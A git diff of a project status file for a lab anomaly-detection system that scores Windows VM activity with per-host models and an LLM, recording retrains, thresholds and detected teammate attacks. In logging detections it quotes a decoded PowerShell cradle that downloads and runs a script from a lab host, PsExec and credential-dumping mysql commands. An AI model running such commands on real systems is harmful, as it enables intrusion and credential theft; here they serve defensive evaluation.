@@ -1,7 +1,247 @@
-# PROGRESS (status as of 2026-11-09)
+# PROGRESS (status as of 2026-11-15)
 
 Replace lines in place when status changes; no history. "Verified" = checked in code/data.
-Branch: **`retrain-to-avoid-false-positive`** (from `main`). All work on the Proxmox VMs.
+Branch: **`test-train-with-two-window-vm`** (from `main`). All work on the Proxmox VMs. The trainer checkout is
+**`test-train-with-two-window-vm` @ `4aaafbc`**, clean (2026-11-15 ~11:02Z, Ansible `--tags project -e repo_branch=…`), not `main`.
+This deploy also brought `a788fc8` live: anomaly-first `correlate.py` (`/api/crosshost` 200) and the projector-friendly UI
+(collapsible LLM card, Present toggle / `#present=1`, Parameters = [OURS] + τ only).
+
+## 2026-11-15 False-positive review + `ws-etw-0` retrain → `exp17-ws0` (LIVE)
+
+Details: `docs/notes/fp-review-20261115.md`. Plan: `~/.claude/plans/i-need-to-check-wondrous-chipmunk.md`.
+- **Live since ~13:43Z (user decision):** `ws-etw-0` = **exp17-ws0** (all DC-era data 11-09 16:49Z → 11-15 11:20Z, 198 of 4,153 windows
+  excluded, gate pass). `ws-etw-1` stays **exp15-ws1**: its retrain was aborted by the user (few false positives there). Verified:
+  `/healthz` ok, `/api/status` exp17-ws0 converter `match`, 4.5, NET rule off. Rollback: `lab promote exp16-ws0 --host ws-etw-0`, then restart.
+- **Re-score of the same 819 ws-etw-0 windows (4.5, rule off):** benign red 24 → 9 (≈8 → 3/day, mostly in-sample); DVWA attack windows
+  51–53 → **7.3–7.9** (still red, below benign GPO-editor windows at 14–15; 1 tail window lost) — the ngen-burst trade-off. By the
+  pre-set rule it was "not better"; the user deployed it anyway.
+- **LLM budget** reset by hand (30/30 were used by 13:20Z, mostly restart re-reads); the 2 skipped windows (13:20Z, 13:25Z, admin MMC)
+  re-ran → `false_positive`.
+- **Not done:** 24 h soak on exp17-ws0; `ws-etw-1-20261115.json` exclusions are written (8 newly found teammate runs) but unused;
+  model files committed (exp17-ws0, small set as for exp16). Trainer scratch: `~/retrain-20261115/`.
+
+## 2026-11-15 Deliverables updated with the teammate's react2shell detection + submission bundle
+
+User: the teammate confirmed their attack was caught (UI history 11-15 06:07–12:07 +07). Deck + report now carry it as a
+**second result** (exp08 DVWA demo stays the main story; in-sample caveat stated everywhere).
+- **Report (`latex/`, 26 pages, builds clean):** abstract, goals, lab table (`ws-etw-1` row, `ws-etw-0` = DC note), deviation
+  table (4.5 cut-off, NET rule, D12, D14), new **R4** (`sec:res-ws1`: 11-14 green at 10 → 4.5; 11-15 13.44/9.93 NET-suppressed →
+  rule off → 04:15Z 7.24 / 04:20Z 19.86 red, LLM attack 0.85/0.95; 04:40Z 4.66→3.03 after restart; 04:50Z 5.92 FP), limits,
+  conclusion, appendix D12/D14 + cut-off/NET-rule paragraphs. All `\todoval` filled: UI screenshots (`images/res-*.png`), LLM =
+  DeepSeek `deepseek-flash`, report excerpt. **Fixed a wrong date:** the exp08 attack window 17:10Z and FP 22:25Z are **11-05**,
+  not 11-06 (report + note.txt). Fixed "UTC thật" → LLM document times are UTC+7 (`alg2.DISPLAY_TZ`).
+- **Deck (`presentation/`, 15 slides, builds):** LabInfra shows both hosts + VPN attacker; "live ≥ 4.5" line; new "Video demo 2"
+  **placeholder** (teammate puts the YouTube id in the commented iframe) + "Kết quả thứ hai" slide; note.txt Q7 extended, Q13 added.
+- **Submission:** `submit/` (gitignored) holds the form answers + docx/pptx/source/demo/dataset files; rebuild with the project
+  skill `sync-submit` (`.claude/skills/sync-submit/scripts/sync_submit.py [report|slides|source|demo|check]`).
+- **Mismatch:** this file's D14 section still says the `ws-etw-1` Sysmon rollout is owed; DEVIATIONS D14 says both hosts
+  (2026-11-13) and the 11-15 ws-etw-1 windows carry command lines → looks done; user to confirm.
+
+## 2026-11-15 Cross-host correlation rebuilt anomaly-first (D13), local only
+
+User: the flow-first layer ("connections between the monitored VMs, found by code") was network monitoring, not anomaly
+detection. `correlate.py` now starts from a **red window**: NET nodes in its kept subgraphs that point at the other VM →
+5-tuple join on the raw knet lines → the peer's socket, owner process and nearby nodes with the **peer model's** scores →
+`pending` / `one-sided` / `corroborated` → LLM on both sides. `link` level, `lab flows` and `flow-baseline.json` removed;
+API `/api/crosshost`, UI panel "Cross-host follow-up".
+- **Verified:** `./selftest.sh` 20/20 (synthetic windows only = "it runs").
+- **Not done:** not committed, not deployed to the trainer; never run on real data; no crossing attack yet.
+
+## 2026-11-15 NET rule OFF live (both hosts, D8)
+
+The teammate's second react2shell run on `ws-etw-1` (11-15 03:35–04:40Z, from VPN client 10.8.0.3: winPEAS, `sc`/`schtasks`
+enumeration, node.exe → cmd → `powershell -enc`) scored 13.4 / 9.9 / 7.2 / 19.9 / 4.66 but stayed green: all suppressed by the NET
+rule (the RCE reused the inbound HTTP socket, a normal-looking NET node). User decision: **rule off, accept some false positives**.
+- **Deployed 2026-11-15 05:03Z:** `live_sg_require_types=none` in `proxmox.ini` (new template var, default `net`), same
+  `--start-at-task "Install the live-server systemd unit"` path. Verified: unit `--sg-moderate-from 4.5 --sg-require-types none`,
+  `/healthz` ok, `/api/status` `require_types = []`, models exp16-ws0 / exp15-ws1, converter `match`.
+- **Re-judge (D8 table):** ws-etw-1 rule off → 7 attack-run windows red (on: 1) + 7 other; ws-etw-0 4 → 9 red. ≈ 5 benign red/day
+  per host; LLM budget raised 15 → 30/day (user, 2026-11-15) so false alarms are less likely to use it up.
+- **Live after restart** (the server re-read the last hour from Loki into `.r3`/`.r4`): ws-etw-1 04:15Z (7.24) and 04:20Z
+  (19.86) now **red**; ws-etw-0 04:30Z (our DVWA test) red. But ws-etw-1 04:40Z re-scored **3.03** (was 4.66 before the
+  restart) and stays green: [INFERENCE] the re-read starts mid-run, so PROCESS/NET nodes lose earlier events (idle gaps,
+  start edges) and the score moves. Same window, different score across restarts = another fragility note.
+- **Not verified yet:** a fresh attack going red live with the rule off (in-sample so far).
+
+## 2026-11-15 Live SG-Det cut-off lowered 10 → 4.5 (both hosts, D8)
+
+The teammate's react2shell attack on `ws-etw-1` (11-14 18:10–19:00Z, confirmed from Sysmon command lines: encoded-PowerShell reverse
+shell, winPEAS, recon.bat, RanSim) stayed green at 10. Re-judging 24 h of saved subgraphs showed that 5 alone would not fire either:
+the NET-rule-eligible peak is 4.72. User chose **4.5 + NET rule kept**: ws-etw-1 would have gone red only at 18:45Z (0 other), ws-etw-0
++1 (17:30Z). Plan: `~/.claude/plans/i-need-to-deploy-sharded-gosling.md`; table in D8.
+- **Deployed 2026-11-15 02:55Z:** `live_sg_moderate_from=4.5` in `proxmox.ini`, applied with `ubuntu.yml --tags project
+  --start-at-task "Install the live-server systemd unit"` (skips git/uv, so the trainer checkout was not touched). Verified: unit flag
+  4.5, `/healthz` 200, `/api/status` `params.alg1.moderate_from = 4.5` on both hosts, models unchanged (exp16-ws0 / exp15-ws1).
+- **Not verified yet:** a fresh attack run going red live at 4.5 (it was tuned on the same run; margin 4.72 vs 4.5). Caveats: D8.
+- **Trainer checkout:** branch `test-train-with-two-window-vm`, **not** `main`. A plain `--tags project` would check out `main` and
+  roll back the two-VM code; use `-e repo_branch=test-train-with-two-window-vm` or merge first.
+- **UI Parameters panel (`6db7b2e`, deployed 03:11Z):** both hosts side by side at the top of the UI: model + training
+  hyperparameters, τ, windows, SG-Det cut-off + NET rule, LLM, running git sha. Verified live: both show exp16-ws0 / exp15-ws1,
+  layers 2 [OURS], Moderate from 4.5 [OURS], code `6db7b2e` clean. History cut-off column no longer rounds 4.5 to 5.
+
+## 2026-11-13 Process command lines (Sysmon EID 1, D14): LIVE + verified on `ws-etw-0` (`67f3968`)
+
+Teammate's ask: process rows only showed `powershell.exe` / `cmd.exe`, not which command ran. Fix (D14): Sysmon EID 1 (ProcessCreate)
+only, read by the collector as optional provider `sysmon`, joined to PROCESS nodes by PID + start time (`src/pipeline/cmdlines.py`,
+`-enc` decode + secret redaction). Shown in the UI tables + LLM document; **never a feature** → converter sha unchanged, no retrain.
+New role `win_sysmon`. Plan: `~/.claude/plans/my-friend-suggest-me-fluttering-swan.md`. Committed `67f3968` on this branch.
+- **Deployed (off the branch, `-e repo_branch=…`):** Sysmon v15.22 on `ws-etw-0`; collector redeployed (4th provider `sysmon`, its
+  VM selftest passed, 0 ETW events lost); trainer on `67f3968`, `ocr-live` restarted; Kali attack pack with neutral stage names
+  (`/u.ps1` `/s.ps1`, env `U_H/U_P/U_D`). `./selftest.sh` 20/20.
+- **Verified end-to-end (live, DC):** idle window `20261113T124000Z` **green**, 2 cmdlines matched. DVWA attack window
+  `20261113T124500Z` **red** (subgraph 51.7, Moderate), **LLM `attack` 0.93**, 77 cmdlines matched. UI process table shows the command
+  line under each process; the `-enc` cradle shows **decoded** (`$env:U_H=…;iex ((iwr http://10.21.4.30:8080/u.ps1…`); short-lived
+  LOLBins caught (`PsExec64 -s cmd /c whoami`, `ping 127.0.0.1`, `mysql … SELECT user,password FROM dvwa.users`). LLM doc carries the
+  command lines; **grep for lab words (`LAB_`/`killchain`/`attack-lib`/`attack-labels`) = clean**. `converter_check` = `match` (scores
+  unchanged). Loki `{provider="sysmon", host="ws-etw-0"}` flowing.
+- **Still owed:** `ws-etw-1` rollout (same path), then this reads "both hosts"; merge the branch to `main` (the VM collector normally
+  clones `main`; a backup of the 30 identical artifact files is `~/pre-d14-artifacts-backup.tgz` on the trainer).
+- **Caveat:** the LLM now sees more evidence, so **verdicts before/after D14 are not comparable** (D14). Command lines go to the
+  external LLM provider; redaction is pattern-based, not a guarantee.
+
+## 2026-11-12 Topology correction + `ws-etw-0` DC retrain → `exp16-ws0` (two-VM live, verified)
+
+Plan: `~/.claude/plans/hmm-forget-the-alert-async-wigderson.md`. The teammate revealed, and Loki + WinRM confirmed, that the VM roles
+are the **reverse** of our earlier records, with a change we never captured:
+- `ws-etw-1` (.11, hostname `WEB-SERVER`, DomainRole 3) = the teammate's **react2shell** node.js RCE app = the attack **entry**.
+- `ws-etw-0` (.10, hostname `WIN-3CSNFVOEN0R`, DomainRole 5) = **Primary Domain Controller** of `nt2102.lab` (ADWS/DFSR/DNS/NTDS),
+  **promoted 2026-11-09 10:41:41Z** (ntds.dit CreationTimeUtc). Still runs DVWA/XAMPP (httpd×2).
+- **exp10 was blind to the DC role:** it trained on idle ending 11-09 10:25Z, **16 min before** the promotion, so AD services/traffic were
+  out-of-distribution. red=0 under exp10 was steady-state luck, not a covered baseline — same failure mode as the ws-etw-1 NetBIOS
+  broadcast, larger surface.
+
+**Fix = `exp16-ws0`** (user decisions 2026-11-12): retrain ws-etw-0 on its current DC state; benign **includes DC steady-state + admin
+RDP/console sessions** (a D2 variant), exclude only canaries + attack bursts; deploy even if the gate fails.
+- **Data:** `range-20261109T164900Z-ws-etw-0` — start = the first clean dos-map run (`live-20261109T164916Z`) **after** the
+  promotion/reboot burst, sidestepping the one-time 10:45Z dcpromo churn (60k kproc in 15 min). 2107 windows, **67 excluded**
+  (`src/artifacts/exclusions/ws-etw-0-20261112.json`: 12 rotation canaries + the 11-10 14:49–15:05Z DVWA→RCE kill chain), 3.78M edges
+  kept. Label source: operator assertion, DC steady-state + admin benign — **no admin-looking-attacker detection claimed on ws-etw-0**.
+- **Gate (seed 360, `--layers 2 --val-windows 60 --tnr-tolerance 0.01`): PASS.**
+
+| Type | n_train | n_val | best_ep | τ | val_fpr |
+|---|---|---|---|---|---|
+| file | 202,129 | 4,149 | 99 | −0.098 | 0.0002 |
+| net | 69,603 | 2,130 | 99 | +0.037 | 0.0000 |
+| process | 31,507 | 882 | 99 | −0.315 | 0.0023 |
+
+  The NET gate — the DC risk — is the strongest (2,130 val NET nodes, val_fpr 0; vs ws-etw-1's 243): training on the DC state made its
+  NET in-distribution. converter_check `match`. The spread seeds (`exp15s`) were abandoned mid-run to free the trainer; rerun later if wanted.
+- **Deploy (2026-11-12 ~16:05Z):** `lab promote exp16-ws0 --host ws-etw-0` + `exp15-ws1 --host ws-etw-1`, `lab hosts ws-etw-0 ws-etw-1`,
+  restart. Both converter `match`. **First check:** ws-etw-0 11 scored **0 red** (max sg 6.53 < Moderate 10), ws-etw-1 0 red; `ocr-live`
+  0.79 GB and building. **Rollback:** `lab promote exp10 --host ws-etw-0 && sudo systemctl restart ocr-live`.
+- **Resolved open item:** the 11-10 14:50Z ws-etw-0 "false positive" was the **real DVWA→RCE kill chain** (psexec / mysql×45 / rclone /
+  schtasks `UpdaterSync` / wevtutil, SessionID=0 via the httpd RCE shell, 14:51–14:54Z, verified in Loki) — exp10's LLM `attack` 0.9 was a
+  **true positive**, now excluded from exp16-ws0 training.
+- **Next action corrected to react2shell (ws-etw-1) → DC (ws-etw-0)** (was "DVWA → react2shell"); see the block below.
+
+## 2026-11-12 Two-VM live: `ws-etw-1` scored by exp15-ws1, `ws-etw-0` by exp10→**exp16-ws0** (verified on the trainer)
+
+Plan: `~/.claude/plans/hmm-forget-the-alert-async-wigderson.md`. User decisions (2026-11-12): retrain `ws-etw-1` on its current state,
+**include the teammate's setup and RDP sessions**, exclude only their exploit/enumeration runs, and **deploy even if the gate fails**.
+
+- **Why exp11/exp14 struggled (root cause, verified):** the NetBIOS broadcast `10.21.3.255:138` (kernel `System`, NetBIOS datagram)
+  first appears on `ws-etw-1` at **11-09 09:19Z**, 51 min before the old range ended, so it sat only in the validation tail. 5 of the
+  6 validation NET nodes over τ in exp14 were that broadcast. `ws-etw-0` has it in 231 training windows. It is not one-off peers:
+  `ws-etw-0` meets as many new peers (594 peers, 18 % of validation NET nodes unseen in training) and flags none, because features are
+  behaviour, not addresses. After 11-10 the broadcast is in 112 of 287 `ws-etw-1` windows. Cause of the change unknown (no new
+  process started that hour) [INFERENCE: a network setting or another machine started NetBIOS].
+- **Data:** `range-20261106T203000Z-20261112T1215Z-ws-etw-1` (pulled with `loki_pull.py --id`, 37 min incl. build): 4,070 windows,
+  6,037,156 edges, `check.json` ok, converter `cbbf6dc` = live. Post-setup days carry about twice the file events of idle days.
+  Exclusions `src/artifacts/exclusions/ws-etw-1-20261112.json` (30 ranges, 214 windows): 23 rotation canaries + 7 teammate attack
+  bursts found from Loki ProcessStart (11-09 11:33–11:45Z, 12:38–13:30Z, 16:26–17:08Z, 17:12–17:32Z = react2shell RCE via
+  `node.exe` incl. the `hacked` file at 17:27Z; 11-10 12:37–13:02Z `runas`/`whoami` privesc tests; 15:10–15:44Z winPEAS/`systeminfo`/
+  `netsh`; 16:54–17:11Z `icacls` ×8, ambiguous). Kept: the 11-09 10:19–10:33Z lab setup (`net user`, `icacls`, `runas` → git clone,
+  Node/npm install), every RDP session, the every-minute `maintenance.ps1 → whoami` task, react2shell's server. Label source:
+  operator assertion, **not idle-only** (D2); `lineage.json` still says "idle Loki range", read it with this note.
+- **Gate, exp15-ws1** (`--layers 2 --val-windows 60 --tnr-tolerance 0.01`, the `ws-etw-0` setting), seed 360 = the deployed model:
+
+| Type | n_train | n_val | best_ep | τ | val_fpr |
+|---|---|---|---|---|---|
+| file | 490,478 | 9,156 | 99 | −0.063 | 0.0004 |
+| net | 16,179 | 243 | 99 | −0.172 | 0.0000 |
+| process | 57,893 | 1,527 | 99 | −0.202 | 0.0020 |
+
+  Passes at 0.01 with the broadcast in training, so the 0.06 workaround (exp14) is not needed. Seeds 361/362 (`exp15s-ws1`, same data
+  and flags) train after deployment only to report the spread: **pending**. 9.5 s per epoch, 4.5 GB peak, no swap.
+- **Deploy (2026-11-12 ~14:10Z):** Ansible `--check --diff` then apply (4 changed, 0 failed); `lab promote exp10 --host ws-etw-0`,
+  `lab promote exp15-ws1 --host ws-etw-1`, `lab hosts ws-etw-0 ws-etw-1`, restart. Both `converter_check: match`.
+- **First check (14:20Z):** both engines follow Loki (`ws-etw-0` lag −1.6 s, `ws-etw-1` caught up from 34 min behind to 3.4 s).
+  `ws-etw-1` 12 windows scored, **0 red**, median sg 0.0, max 1.99, no NET-rule suppression; `ws-etw-0` 12 scored, 0 red.
+  `ocr-live` 1.06 GB. Correlation on (then flow-first: 5 benign `link`s; the layer is anomaly-first since 2026-11-15, D13). Label source for "0 red": operator assertion that nobody acted on either VM then. Not a soak, not a detection result.
+- **Rollback:** `lab hosts ws-etw-0 && sudo systemctl restart ocr-live` (assignments stay).
+- **NEXT ACTION (user, 2026-11-13): verify cross-host with the teammate's REAL attack** — `react2shell` (ws-etw-1) → DC (ws-etw-0),
+  so the correlation layer (D13) fires on real flows. **Changed 2026-11-13:** the attack is the **teammate's real one, not our injected
+  kill chain**, so we do **not** build a synthetic scenario in `src/atomic-attack-pack/` (the old prereq (b) is dropped) and there is
+  **no self-logged label oracle** (D6) — ground truth = the teammate's account + time window (operator assertion; blocks any P/R/F1
+  claim). Expected: `ws-etw-1` red (react2shell entry) with the pivot socket `10.21.3.10:<port>` inside a kept subgraph → followed to the
+  DC's process → `one-sided` or (if the DC's model flags it) `corroborated`, LLM explains both sides and cites the real command lines
+  (D14). Prereqs, in order: (a) roll Sysmon/D14 out to `ws-etw-1` so its entry commands show (user, 2026-11-13); (b) deploy the
+  anomaly-first `correlate.py` (2026-11-15) to the trainer; (c) confirm the attack scores red on **each** host —
+  if react2shell's exploit or the DC pivot does not go red (D6 risk: node server + AD auth are in-distribution), that is a **finding to
+  report, not to hide**. Scope honesty: lateral movement with a known lab credential, not credential theft; DCSync/real cred-dump out of
+  scope. A network-focused attack-flow note for the teammate is at `docs/notes/cross-host-attack-flow.md` (the user's imagined path).
+- **Still owed alongside it:** 24 h soak of both hosts (red windows checked one by one); ask the teammate what turned NetBIOS on at
+  11-09 09:19Z. The 11-10 14:50Z `ws-etw-0` reconciliation is **resolved** (true positive — the DVWA→RCE kill chain, see the exp16-ws0
+  section above). The deliverables (deck, report, recorded demo) still show one VM (pre-DC); whether the lateral-movement demo joins them
+  is open — the recorded single-host demo stays frozen and internally consistent.
+
+## 2026-11-12 exp14-ws1 (tol 0.06): passed the gate by tolerating unseen validation nodes; superseded by exp15-ws1, never deployed
+
+Same baseline as exp11 (`range-20261106T203000Z-ws-etw-1`), only `--tnr-tolerance 0.01 → 0.06`. **Correction:** the explanation
+committed in `a66cd56` ("2-3 brand-new benign peers in every validation set") is wrong; the real cause is the NetBIOS broadcast above.
+The numbers stand: `--patience 15` was byte-identical to `--patience 5` (exp13 = exp12, NET best_ep 20/99/7), so patience is not the
+lever; 0.03 fixed PROCESS only; 0.06 gave best_ep 99 on all types and 3 seeds, NET τ −0.028/−0.073/−0.128. Held-out idle (3 models
+`exp14v-ws1-s36x`, 156 windows, NET rule, Moderate from 10): 0/0/0 red vs exp09-ws1's 2; seed 361 had one idle window at raw sg 117.0
+kept green only by the NET rule. Preview 11-10→11-11 (287 windows): 0 alerts. Output `src/out/etw/eval/ws1-*-v14/`; models
+`exp12`–`exp14*` kept on the trainer as evidence.
+
+## 2026-11-11 `ws-etw-1` retrained as exp11-ws1: gate NOT passed on NET, NOT promoted (verified on the trainer)
+
+Walk-through with the reasoning and repeat commands: `docs/notes/ws-etw-1-retrain-20261111.md`. Plan: retrain `ws-etw-1` only, then two-VM live. Phases 1–2 done, Phase 3 not started.
+`ocr-live` is unchanged: one-VM mode, `ws-etw-0`, exp10.
+
+- **`ws-etw-1` stopped being idle on 11-09 10:17Z** (Loki kproc). RDP sessions with `git`, `msiexec`, `node`, `msedge` on 11-09;
+  `winPEASany.exe`, `icacls`, `netsh` on 11-10; **since 11-10 15:36Z a SYSTEM scheduled task runs `C:\Lab\Scripts\maintenance.ps1` →
+  `whoami` every minute**. Not in this repo and not the user's: **owner to be confirmed with the team (open)**.
+- **Baseline:** experiment `range-20261106T203000Z-ws-etw-1`, 11-06 20:30Z → 11-09 10:10Z, 1,848 windows, 822,495 edges, `check.json` ok,
+  converter `cbbf6dc` = live. 184 windows excluded (`src/artifacts/exclusions/ws-etw-1-20261111.json`: 10 rotation canaries, RDP connected
+  11-07 03:40–03:56Z and 11-08 16:41–20:56Z), 1,664 kept, about 55 h. Label source: operator assertion + a tally of all 3,456 process
+  starts. A first pull from 16:30Z failed at the build: the first run has no dos map in Loki (runbook §3).
+- **Gate, exp11-ws1, exp08 flags, 3 seeds** (saved model = seed 360):
+
+| Type | n_train | n_val | best_ep 360 / 361 / 362 | τ 360 / 361 / 362 | val_fpr (mean ± std) |
+|---|---|---|---|---|---|
+| file | 127,694 | 4,078 | 99 / 99 / 99 | -0.006 / 0.113 / 0.015 | 0.0058 ± 0.0027 |
+| process | 14,230 | 550 | 99 / 31 / 12 | -0.090 / -0.058 / 1.957 | 0.0097 ± 0.0028 |
+| net | 4,189 | 204 | 14 / 9 / 4 | 0.764 / 0.885 / 2.824 | 0.0082 ± 0.0028 |
+
+  FILE passes. **NET stops early on every seed and PROCESS on 2 of 3**, so the gate fails although NET has 11× the data of exp09-ws1.
+  Cause (verified in `train_scores.csv`): `--tnr-tolerance 0.01` allows 2 of about 200 NET validation nodes over τ. In the held-out
+  models the same 2 nodes are over on every seed: one peer, `23.41.37.42:443`, the Defender signature download of 11-08 14:40Z, copied
+  into 3 overlapping windows. In the final model the 2 are the NetBIOS broadcast node `10.21.3.255:138`. The host has 585 distinct NET
+  peers in 62 h and 473 of them appear in ≤ 3 windows, so a validation tail always holds a peer never seen in training. More idle
+  data does not fix this. **Open decision (user): a stopping-rule setting for this host, or leave `ws-etw-1` unscored.** Not tuned.
+- **Held-out idle** (3 models `exp11v-ws1-s360/361/362` trained without 11-08 21:00Z → 11-09 10:10Z, replayed on those windows, NET rule
+  on, Moderate from 10, vs exp09-ws1; `lab compare`, output in `src/out/etw/eval/ws1-holdout/`): 156 windows scored by all four
+  models, 152 idle + 4 canary. **Idle red: exp09-ws1 2 (22:05Z sg 16.9, 04:15Z sg 67.7); held-out models 0 / 0 / 0 (0.0 ± 0.0).**
+  Each held-out model has one window with a subgraph ≥ Moderate that the NET rule suppressed (s360 01:25Z 10.05; s361 04:15Z 24.47;
+  s362 04:15Z 11.73), so without the rule it is 1 red per seed. Read with care: s360's NET (best_ep 2, τ 3.43) and PROCESS (16, τ 1.14)
+  barely trained, and a weak NET model alerts less under the NET rule. Only s362 trained NET and PROCESS to epoch 99 (FILE 64); it is
+  the one seed whose 0 red is evidence. Label source: operator assertion. One 13 h stretch, not a rate.
+  A first replay attempt scored 35 of 156 windows: a new replay session drops the windows still queued for scoring, so the driver
+  now waits for scoring to drain between runs
+- **Preview of today's `ws-etw-1`** (11-10 16:00Z → 11-11 16:00Z with the once-a-minute task, exp11-ws1; not benign evidence, not a
+  detection result; output in `src/out/etw/eval/ws1-preview/`): 287 windows scored, **1 alert** (11-11 11:35Z, sg 10.20: Defender
+  platform DLLs `mpclient.dll` / `mpcommu.dll`, networking DLLs and one new peer `23.56.25.40:443`, i.e. a Defender update, a false
+  alarm; label source: my reading of the kept subgraph) and 1 Moderate subgraph suppressed by the NET rule (11-10 16:10Z, 10.24,
+  file only). Median sg 0.00, p95 1.87. **The once-a-minute `powershell → whoami` task does not raise alerts**: its nodes score
+  in-distribution, as lone short-lived processes did before (D6). 1 alert per 24 h is under the plan's stop rule (≤ 3), so the
+  LLM budget is not the blocker; the failed NET gate is. The saved seed's NET is weakly trained (τ 0.76), so this count may be low
+- **exp10 on `ws-etw-0`, first 48 h live** (11-09 16:00Z → 11-11 16:00Z, `/api/history`): 568 scored windows, **1 alert** = 11-10 14:50Z,
+  the kill chain (`mysql` ×45, PsExec, rclone, `wevtutil`; sg 69.09, LLM `attack` 0.9), **0 benign alerts**, 4 Moderate subgraphs
+  suppressed by the NET rule (11-09 18:10Z, 11-10 00:10Z, 01:10Z, 17:50Z). Who launched the 11-10 run: to be confirmed by the user.
+- **Not done:** Phase 3 (deploy from `main`, `lab promote --host`, `lab hosts ws-etw-0 ws-etw-1`, 24 h soak). Blocked on the two open
+  items above. Models and eval output live only on the trainer (`src/artifacts/runs/exp11*`, `src/out/etw/eval/ws1-*`).
 
 ## Next action (user, 2026-11-09)
 
@@ -38,19 +278,19 @@ Branch: **`retrain-to-avoid-false-positive`** (from `main`). All work on the Pro
   unchanged) only if it holds ≥ 1 anomalous NET node; otherwise suppressed and logged with the reason (D8). Offline re-judge
   (exp08, 10 sessions since 11-05): alert windows 19 → 8, attack windows 5/5, false alarms 14 → 3 (all human sessions). Replaced
   the first three-type version, which lost the 00:50Z C2 window.
-- **Later (nice-to-have): verify the `ws-etw-1` model and the correlation layer** (`docs/notes/verify-two-host.md`). Steps: `docs/notes/training-runbook.md`.
+- **Nice-to-have, in progress: the `ws-etw-1` model and the correlation layer** (`docs/notes/verify-two-host.md`). Model status: top section.
 
 ## 2026-11-07 one model per host + cross-host correlation: built, NOT deployed (selftests + UI check only)
 
-On branch `trainer-monitoring-guard`, not pushed, not on the trainer. Built: `lab promote --host`, `lab hosts`, `lab flows`, one
-engine per VM, `src/live/correlate.py` (D13), multi-host LLM report, UI ("X is trained for Y" line, VM tabs, one timeline row per
+On branch `trainer-monitoring-guard`, not pushed, not on the trainer. Built: `lab promote --host`, `lab hosts`, one
+engine per VM, `src/live/correlate.py` (D13, rebuilt anomaly-first 2026-11-15), multi-host LLM report, UI ("X is trained for Y" line, VM tabs, one timeline row per
 VM, Cross-host activity panel, History VM column). Checked: `./selftest.sh` 19/19; real `live_server.py` startup in one- and
 two-host mode; UI in Playwright on fake data (one-VM, two-VM, no baseline, host not recorded). A selftest confirms a VM's
 windows match a plain engine. Not yet: real two-VM run, trainer memory with two engines, a replay of a saved `ws-etw-0` session
-in both modes, `lab flows` on real data.
+in both modes.
 
 To go live: push, `ansible-playbook -i proxmox.ini ubuntu.yml --tags project -e repo_branch=trainer-monitoring-guard`, then on the
-trainer `lab promote exp08 --host ws-etw-0`, `lab promote exp09-ws1 --host ws-etw-1`, `lab flows --start ... --end ...`,
+trainer `lab promote exp08 --host ws-etw-0`, `lab promote exp09-ws1 --host ws-etw-1`,
 `lab hosts ws-etw-0 ws-etw-1`, `sudo systemctl restart ocr-live`, and watch memory in Grafana during catch-up. Until `lab hosts` is
 run, `ocr-live` stays on exp08 and `ws-etw-0`.
 
@@ -73,9 +313,8 @@ types, val_fpr 0). `--patience 20` gave identical results, so it is not an early
 (+3.47, +2.25; train max -0.00) are one benign job, `mousocoreworker.exe` -> `57.154.63.210:443` at 01:20Z, which appears only in
 the validation tail. 9 of 17 validation NET peers are absent from training. The baseline is too short; do not tune around it.
 
-Next: retrain on about 3 days. Loki keeps 72 h, so pull before the 11-06 17:00Z data expires: about 11-09 16:00Z, new
-exclusions for later rotations. Until then exp09-ws1 can stand in for building Part B; expect false alarms on `ws-etw-1`.
-`lineage.json` `hosts` is null for single-host builds: Part B's `lab promote --host` guard needs that recorded.
+Superseded 2026-11-11 by exp11-ws1 (top section): 55 h of idle fixed FILE, not NET.
+`lineage.json` `hosts` is null for single-host builds (exp10, exp09-ws1, exp11-ws1): `lab promote --host` cannot check the pairing.
 
 ## 2026-11-07 trainer resized, monitoring live and protected from training (verified on the trainer)
 
@@ -363,9 +602,12 @@ idle model — Moderate, not Significant. **Cleanup DONE** (user ran it from RDP
 task deleted, tools dir + legacy marker removed, PSEXESVC/tool processes stopped). Repo selftests 17/17; attack-pack +
 ansible + docs changes committed signed (handed to the user). See [[live-detector-benign-fp]], DEVIATIONS D6/D8.
 
-**nt2102-vpn (2026-11-04):** VM 2105 at 10.21.3.50, OpenVPN running since 11-02, team client certs in use. External TCP 2102 → home
-router → pve-master DNAT (`src/ansible/proxmox-firewall.yml`) → 10.21.3.50:1194, verified over TCP. The VM rule
-and the DNAT comment now say TCP (were UDP): needs `terraform apply` + a `proxmox-firewall.yml` re-run.
+**nt2102-vpn (2026-11-15):** VM 2105 at 10.21.3.50, OpenVPN (hand-installed 11-02), team client certs in use. External TCP 2102 → home
+router → pve-master DNAT (`src/ansible/proxmox-firewall.yml`) → 10.21.3.50:1194. **Verified 2026-11-15:** clients get the Kali route
+(`10.21.4.0/24`, teammate SSH to `kali` works) and keep their real `10.8.0.x` source to the lab + Kali (no SNAT; pve-master return
+route + `nt2102:` FORWARD accepts; `vpn.yml` role `vpn_routing`), checked by the user from a client and by the trainer sshd log.
+GNN scores unaffected (features carry no IPs); the LLM/IOC/correlation now see the client IP. The pve-master route is lost on reboot/SDN
+apply → re-run `proxmox-firewall.yml`. Baselines exp15/exp16 saw admin RDP from `10.21.3.50`; new sessions show `10.8.0.x`.
 
 **ubuntu-etw (2026-11-02):** third Proxmox VM, VM 2104 at 10.21.3.11 (Ubuntu 24.04 cloud image + cloud-init, like
 the trainer), direct SSH over the routed path. auditd → `auditship` (`src/audit-python`) → trainer Loki
